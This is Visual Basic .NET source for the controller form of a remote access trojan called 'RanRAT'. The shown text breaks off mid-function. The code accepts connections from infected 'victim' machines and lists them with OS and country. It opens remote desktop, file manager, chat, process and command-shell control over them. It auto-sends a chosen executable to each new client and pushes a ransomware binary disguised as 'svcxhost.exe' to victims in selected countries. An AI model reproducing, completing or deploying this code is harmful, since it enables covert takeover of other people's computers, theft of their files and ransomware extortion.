Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.Globalization

Public Class Form1
    Private issign As Boolean = False
    Friend WithEvents s As New SocketServer
    Private Masterpoint As Point
    Private newLX, newLY As Integer
    Private localport As Integer
    Private BuilderHost As String = "Host"
    Friend colorx As Integer = 0
    Private BuilderPort As Integer = 1177
    Private BuilderName As String = "Trojan"
    Private ServerPort As Integer = 1177
    Private BitAdd As String = ""
    Private URan As Boolean = False
    Private OldWidth As Double = 0.0
    Private OldH As Double = 0.0
    Friend trojanpath As String = "notset"
    Friend savable As Boolean = False
    Friend trojanname As String = "notset"
    Public YY As String = "||"
    Friend GUIPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "GUI.exe"
    Friend RanosmwarePath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Dontrunthis.exe"
    Friend RanosmwareEditorPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "rfe.exe"
    Friend Function getBuilderHost() As String
        Return BuilderHost
    End Function
    Friend Function getBuilderName() As String
        Return BuilderName
    End Function
    Friend Function getServerPort() As Integer
        Return ServerPort
    End Function
    Friend Sub setBuilderHost(ByVal s As String)
        BuilderHost = s
    End Sub
    Friend Sub setBuilderPort(ByVal s As Integer)
        BuilderPort = s
    End Sub
    Friend Function getBuilderPort() As Integer
        Return BuilderPort
    End Function
    Friend Sub SetAdd(ByVal x As String)
        BitAdd = x
    End Sub
    Friend Sub settrojanpath(ByVal s As String)
        Me.trojanpath = s
    End Sub
    Friend Sub settrojanname(ByVal s As String)
        Me.trojanname = s
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        firepic.Visible = False

        Masterpoint = New Point(l1.Size.Width / 2, 5)
        Control.CheckForIllegalCrossThreadCalls = False
        RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
        RichTextBox1.ScrollToCaret()

        Try
            Dim Alldata = IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "/Config.cfg")
            Dim Alx() As String = Split(Alldata, "#######")
            BuilderHost = Alx(0)
            BuilderPort = Integer.Parse(Alx(1))
            BuilderName = Alx(2)
            ServerPort = Integer.Parse(Alx(3))
        Catch ex As Exception
        End Try
        localport = ServerPort
        If My.Settings.Rcommand.Equals("1") Then
            My.Settings.Rcommand = "0"
            '   StartListen(localport)
            RichTextBox1.AppendText(vbNewLine & "Restarted Successfully , Saved changed port : " & localport)

            RichTextBox1.ScrollToCaret()
        End If
        If My.Settings.AutoH.Equals("1") Then

            StartListen(localport)

        Else
            RichTextBox1.AppendText(vbNewLine & "Note : Auto Handler is not Activated")

            RichTextBox1.ScrollToCaret()
        End If
        RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")

        RichTextBox1.ScrollToCaret()
        Timer1.Start()


    End Sub

    Private Sub AddFirewall()

        ' fireitem.Text = "127.0.0.1" & vbNewLine & "LocaL Listener"
        ' fireitem.ImageIndex = 5
        '  ListView1.Items.Add(fireitem)
        Dim firepic As PictureBox = Me.firepic
        firepic.Location = New Point(Masterpoint.X - 55, Masterpoint.Y)
        firepic.Parent = l1
        l1.Controls.Add(firepic)
        '   ListView1.Container.Add(firepic)
        ' ListView1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 55, Masterpoint.Y))
        ' fireitem.Position = New Point(Masterpoint.X - 55, Masterpoint.Y)

    End Sub
    Private Sub MasterAccquasition()

        ' Masterpoint = fireitem.Position

    End Sub
    Private Sub ListView1_ItemDrag(ByVal sender As Object, ByVal e As System.Windows.Forms.ItemDragEventArgs) Handles l1.ItemDrag



        Dim lvi As ListViewItem = CType(e.Item, ListViewItem)

        l1.DoDragDrop(New DataObject("System.Windows.Forms.ListViewItem", lvi), DragDropEffects.Move)

    End Sub
    Private Sub ListView1_DragEnter(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles l1.DragEnter

        If e.Data.GetDataPresent("System.Windows.Forms.ListViewItem") Then
            e.Effect = DragDropEffects.Move

        End If
    End Sub
    Private Sub getUpdate()
        MsgBox("This Option will be in next Version", MsgBoxStyle.Information)
        RichTextBox1.AppendText("Command [Update] Requested!" & vbNewLine)
        ''a
    End Sub
    Private Sub ListView1_DragOver(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles l1.DragOver

        Dim lvi As ListViewItem = CType(e.Data.GetData("System.Windows.Forms.ListViewItem"), ListViewItem)
        drawclear(lvi.Position)
        Dim Offset As Size = Size.Subtract(Cursor.Size, New Size(Cursor.HotSpot.X, Cursor.HotSpot.Y))
        lvi.Position = Point.Subtract(l1.PointToClient(New Point(e.X, e.Y)), Offset)

        '   e.Effect = DragDropEffects.Move
        draw(lvi.Position)


    End Sub

    '############ Line Drawer
    Function getstartpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint

    End Function
    Function getendpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint
    End Function
    Public Sub DrawLineFloat(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 

        Dim Penx As New Pen(Color.Lime, 2)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 
        l1.CreateGraphics().DrawLine(Penx, x1, y1, x2, y2)
        l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))

    End Sub
    Private Sub draw(ByVal otherpoint As Point)
        If Not Masterpoint = Nothing Then '!=null
            otherpoint.X += 55

            DrawLineFloat(otherpoint, Masterpoint)
        End If
    End Sub
    Private Sub drawclear(ByVal otherpoint As Point)
        If Not Masterpoint = Nothing Then '!=null
            otherpoint.X += 55

            DrawLineFloatclear(otherpoint, Masterpoint)
        End If
    End Sub
    Public Sub DrawLineFloatclear(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 

        Dim Penx As New Pen(Color.Black, 2)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 
        l1.CreateGraphics().DrawLine(Penx, x1, y1, x2, y2)


    End Sub
    Delegate Sub chatappd(ByVal data1 As String)
    '########### End Drawer
    Private Sub RemoveClient(ByVal index As Integer)
        Try
            l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))

            drawclear(l1.Items(index).Position)
            l1.Items(index).Remove()




        Catch ex As Exception
RE:         index -= 1
            Try
                l1.Items(index).Remove()

            Catch exx As Exception
                GoTo RE
            End Try

        End Try

    End Sub

    ' If ListView1.Items(index).Equals(fireitem) = True Then
    '  index += 1
    '  ElseIf ListView1.Items(index).Equals(fireitem) = False Then
    '  drawclear(ListView1.Items(index).Position)
    '   ListView1.Items(index).Remove()
    ' End If
    '################## Core 

    Private Sub connected(ByVal sock As Integer) Handles s.Connected
        ListBox1.Items.Add(s.IP(sock) & " Connected , client Not logged in")
        s.Send(sock, "info")

    End Sub
    Private Sub disconnected(ByVal sock As Integer) Handles s.DisConnected

        ListBox1.Items.Add(s.IP(sock) & " Disconnected")


        RemoveClient(sock.ToString)
        On Error Resume Next
        For Each CurrentForm As Form In My.Application.OpenForms

            If CurrentForm.Name.Equals("!" & sock) Then
                CurrentForm.Close()
                MsgBox("Desktop Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("Desktop Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
            If CurrentForm.Name.Equals("Chat" & sock) Then
                CurrentForm.Close()
                MsgBox("Chat Box Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("Chat Box Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
            If CurrentForm.Name.Equals("openfm" & sock) Then
                CurrentForm.Close()
                MsgBox("File Manager Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("File Manager Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
            If CurrentForm.Name.Equals("Text_Editor" & sock) Then
                CurrentForm.Close()
                MsgBox("Text Editor Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("Text Editor Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
            If CurrentForm.Name.Equals("\\" & sock) Then
                CurrentForm.Close()
                MsgBox("Process Manager Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("Process Manager Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
            If CurrentForm.Name.Equals("rs" & sock) Then
                CurrentForm.Close()
                MsgBox("Command Prompt Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
                ListBox1.Items.Add("Command Prompt Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !")
            End If
        Next
    End Sub

    Private Function Return_Index(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 3
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("2007") Or OS.Contains("2008") Then
            Return 0
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 1
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 2
        Else
            Return 4
        End If
    End Function
    Private Function Return_Index_Ranl3(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 2
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("2008") Then
            Return 0
        ElseIf OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("2007") Then
            Return 4
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 1
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 2
        Else
            Return 3
        End If
    End Function
    Sub chatappds(ByVal data1 As String)
        Dim f As New Chat
        f.TextBox1.Text = f.TextBox1.Text & f.Victimename & " said : " & data1 & vbNewLine
    End Sub
    '7    0 
    '8-10 1
    '2002 2
    'xp   3
    'un   4


    '######### with ran
    '7    6 
    '8-10 7
    '2002 8
    'xp   9
    'un   10

    Private Function Return_Index_Ran(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 9
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("2007") Or OS.Contains("2008") Then
            Return 6
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 7
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 8
        Else
            Return 10
        End If
    End Function
    Private Function Return_Index_Ran_l3(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 10
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("2007") Or OS.Contains("2008") Then
            Return 8
        ElseIf OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Then
            Return 7
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 9
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 10
        Else
            Return 6
        End If
    End Function
    
    Delegate Sub _data(ByVal sock As Integer, ByVal b As Byte())
    Private Sub data(ByVal sock As Integer, ByVal b As Byte()) Handles s.Data
        Dim a As String() = Split(BS(b), "||")
        Try
            Select Case a(0)


                Case "info"

                    Dim f As Notify = My.Application.OpenForms("newc" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        f = New Notify
                        f.Name = "newc" & sock
                        f.Label9.Text = s.IP(sock)
                        f.Label5.Text = a(1)
                        f.Label7.Text = a(2)
                        f.Label6.Text = a(3)
                        f.Label8.Text = a(4)

                        Try

                            Dim pi As New PictureBox
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(a(5)))
                            SyncLock pi
                                pi.Image = Image.FromStream(m)
                                f.PictureBox3.Image = pi.Image
                            End SyncLock
                        Catch ex As Exception

                        End Try
                        f.Show()
                        '  SpeakThread("New Client Connected")

                    End If
                    Try
                        If a(6).Equals("No") Then


                            Try
                                Dim l As New ListViewItem
                                l.Text = a(1) & " " & s.IP(sock) & vbNewLine & "OS : " & a(3) & vbNewLine & "Country : " & a(4)
                                l.ImageIndex = Return_Index_Ranl3(a(3))
                                l.SubItems.Add(s.IP(sock))
                                l.SubItems.Add(a(2)) ' pc name
                                l.SubItems.Add(a(3)) ' OS
                                l.SubItems.Add(a(4)) ' country
                                l.SubItems.Add(a(6)) 'Ransomware
                                l.ToolTipText = sock
                                l1.Items.Add(l)
                                l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
                                l1.DoDragDrop(New DataObject("System.Windows.Forms.ListViewItem", l), DragDropEffects.Move)
                                l1.Update()

                            Catch ex As Exception

                            End Try


                        ElseIf a(6).Equals("Yes") Then
                            Try
                                Dim l As New ListViewItem
                                l.Text = a(1) & " " & s.IP(sock) & vbNewLine & "OS : " & a(3) & vbNewLine & "Country : " & a(4)
                                l.ImageIndex = Return_Index_Ran_l3(a(3))
                                l.SubItems.Add(s.IP(sock))

                                l.ToolTipText = sock
                                l1.Items.Add(l)
                                Dim lx As New ListViewItem
                                lx.Text = a(1) & " " & s.IP(sock) & vbNewLine & "OS : " & a(3) & vbNewLine & "Country : " & a(4)
                                lx.SubItems.Add(s.IP(sock))
                                lx.SubItems.Add(a(2)) ' pc name
                                lx.SubItems.Add(a(3)) ' OS
                                lx.SubItems.Add(a(4)) ' country
                                lx.ToolTipText = sock

                                l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
                                l1.DoDragDrop(New DataObject("System.Windows.Forms.ListViewItem", l), DragDropEffects.Move)
                                l1.Update()
                            Catch ex As Exception

                            End Try

                        End If

                    Catch
                    End Try



                    If CheckBox1.Checked = True Then
                        Dim filepath As String = Label2.Text
                        Dim Trojanname As String = "task" & sock & ".exe"
                        s.Send(sock, "sendfile" & "||" & Trojanname & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(filepath)))
                    End If
                    'Checks for Ransomware 
                    If CheckBox2.Checked = True Then
                        Dim cientcountry As String = a(4)
                        If ListBox2.Items.Contains(cientcountry) = True Then
                            'Runs Ransomware to Client 
                            s.Send(sock, "sendfile" & "||" & "svcxhost.exe" & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(RanosmwarePath)))

                        End If
                    End If
                    ListBox1.Items.Add(s.IP(sock) & " Connected , client Controlled !")



                Case "!"
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim cap As New Desktop
                    cap.F = Me
                    cap.Sock = sock
                    cap.Name = "!" & sock
                    cap.Sz = New Size(a(1), a(2))
                    cap.Show()
                Case "@"
                    Dim F As Desktop = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If a(1).Length = 1 Then
                            F.Text = "Remote Desktop  : " & s.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                s.Send(sock, "@" & YY & F.c1.SelectedIndex & YY & F.c2.Text & YY & F.c.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, "@" & YY)(1)
                        F.PktToImage(BB)
                        s.Send(sock, "@" & YY & F.c1.SelectedIndex & YY & F.c2.Text & YY & F.c.Value)
                    End If


                Case "chatback"
                    'MessageBox.Show("New cht message ", "Victim Replied ", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Dim Ff As Chat = My.Application.OpenForms("Chat" & sock)

                    Ff.TextBox1.Text &= "Victim Said: " & a(1)
                    Invoke(New chatappd(AddressOf chatappds), a(1))
                    Exit Sub
                Case "readytochat"
                    If My.Application.OpenForms("Chat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Chat
                    fm.sock = sock
                    fm.Name = "Chat" & sock
                    'fm.Text = fm.Text & " " & s.IP(sock)
                    fm.Text &= " With " & s.IP(sock)
                    fm.Show()



                Case "openfm"
                    If My.Application.OpenForms("openfm" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Filemanager
                    fm.sock = sock
                    fm.Name = "openfm" & sock
                    '  fm.Text = fm.Text & s.IP(sock)
                    fm.Text &= " For : " & s.IP(sock)
                    fm.Show()


                Case "viewimage"
                    Dim fff As Filemanager = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Error" Then
                        MsgBox("Recived String Cannot be converted to image please check the file Is an image file ")
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(a(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Show()
                        fff.pic1.Image = Image.FromStream(ms)
                    End If
                Case "getpath"
                    Dim fff As Filemanager = My.Application.OpenForms("openfm" & sock)
                    fff.TextBox1.Text = a(1)
                    s.Send(sock, "FileManager" & YY & a(1))
                Case "FileManager"
                    Dim fff As Filemanager = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Error" Then
                        fff.back()
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(a(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))

                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[Network]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(9)
                            ElseIf itm.Text.StartsWith("Removable") Or itm.Text.Contains("Removable") Then
                                itm.ImageIndex = 58
                                itm.Text = itm.Text.Substring(9)
                            ElseIf itm.Text.StartsWith("[RAM]") Then
                                itm.ImageIndex = 59
                                itm.Text = itm.Text.Substring(5)
                            ElseIf itm.Text.StartsWith("[NOROOT]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.StartsWith("[Unknowen]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(10)
                            ElseIf itm.Text.StartsWith("[Error]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
